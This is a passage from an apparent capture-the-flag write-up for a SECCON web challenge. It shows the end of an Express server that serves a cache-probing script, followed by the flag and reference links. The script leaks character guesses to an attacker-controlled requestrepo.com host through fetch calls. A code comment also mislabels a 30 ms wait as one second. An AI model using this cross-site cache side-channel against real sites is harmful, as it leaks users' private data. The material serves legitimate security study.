                await new Promise(r => setTimeout(r, 30)); // sleeps for 1 second
        }
        try{
                await fetch('/rr',{cache: 'only-if-cached', mode: 'same-origin' })
                fetch('https://<snip>.requestrepo.com/?not-correct-${req.query.prefix+req.query.check}')
        } catch(e){
                fetch('https://<snip>.requestrepo.com/?found-${req.query.prefix+req.query.check}')
        }
        console.log('done')
}
df()
</script>
`)
});
app.listen(5000)
```

`SECCON{lumiose_city}`

## Further Reading

[parrot409 writeup](https://gist.github.com/parrot409/e3b546d3b76e9f9044d22456e4cc8622)
[Chromium Source](http://source.chromium.org/chromium/chromium/src/+/main:net/disk_cache/cache_util.cc;l=136?q=kdefaultcachesize&ss=chromium%2Fchromium%2Fsrc)
